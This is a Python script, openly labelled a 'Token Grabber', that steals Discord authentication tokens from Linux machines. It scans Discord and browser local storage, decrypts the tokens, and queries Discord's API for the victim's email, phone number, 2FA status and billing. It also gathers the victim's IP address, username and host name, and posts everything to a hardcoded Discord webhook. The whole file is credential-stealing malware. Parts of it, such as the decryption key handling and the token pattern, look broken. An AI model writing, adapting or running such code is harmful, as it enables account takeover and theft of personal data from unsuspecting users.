from base64 import b64decode
from Crypto.Cipher import AES
import keyring
import json
import os
import re
import requests
from datetime import datetime
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE

tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        master_key = keyring.get_password('system', 'chrome_master_key')
        return AES.new(b64decode(master_key), AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception as e:
        return f"Error: {e}"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except Exception as e:
        print(f"Failed to get IP: {e}")
    return ip

def gethwid():
    p = Popen("cat /etc/machine-id", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().strip()

def get_token():
    already_check = []
    cleaned = []
    checker = []

    home_dir = os.getenv('HOME')
    if not home_dir:
        raise EnvironmentError("HOME environment variable is not set.")
    
    local = os.path.join(home_dir, '.config')
    paths = {
        'Discord': os.path.join(local, 'discord'),
        'Discord Canary': os.path.join(local, 'discordcanary'),
        'Lightcord': os.path.join(local, 'Lightcord'),
        'Discord PTB': os.path.join(local, 'discordptb'),
        'Opera': os.path.join(local, 'opera'),
        'Opera GX': os.path.join(local, 'opera-gx'),
        'Vivaldi': os.path.join(local, 'vivaldi'),
        'Chrome': os.path.join(home_dir, 'google-chrome'),
        'Microsoft Edge': os.path.join(local, 'microsoft-edge'),
        'Brave': os.path.join(local, 'brave'),
        'Iridium': os.path.join(local, 'iridium')
    }

    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(os.path.join(path, "Local State"), "r") as file:
                key = json.loads(file.read())['os_crypt']['encrypted_key']
        except Exception as e:
            print(f"Failed to read local state file from {path}: {e}")
            continue

        for file_name in os.listdir(os.path.join(path, "Local Storage/leveldb/")):
            if not file_name.endswith((".ldb", ".log")): continue
            try:
                with open(os.path.join(path, f"Local Storage/leveldb/{file_name}"), "r", errors='ignore') as file:
                    for line in file.readlines():
                        for value in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                            tokens.append(value)
            except PermissionError:
                continue

        for token in tokens:
            if token.endswith("\\"):
                token = token.replace("\\", "")
            if token not in cleaned:
                cleaned.append(token)

        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except Exception as e:
                        print(f"Failed to get user info: {e}")
                        continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("USER")
                        pc_name = os.uname()[1]
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
> :piñata: __Token__\n\t`{tok}`\n
*Made by Astraa#6100* **|** ||https://github.com/astraadev||"""
                        payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            headers2 = {
                                'Content-Type': 'application/json',
                                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                            }
                            req = Request('https://discord.com/api/webhooks/1247364290084606052/CnNsZ184abYfD1kj3yAtkOH873RS4c7HVpD5Ryps2wX5Sv4pG-zz9KCRZmPYHIff3llm', data=payload.encode(), headers=headers2)
                            urlopen(req)
                        except Exception as e:
                            print(f"Failed to send webhook: {e}")
                else:
                    continue

if __name__ == '__main__':
    get_token()
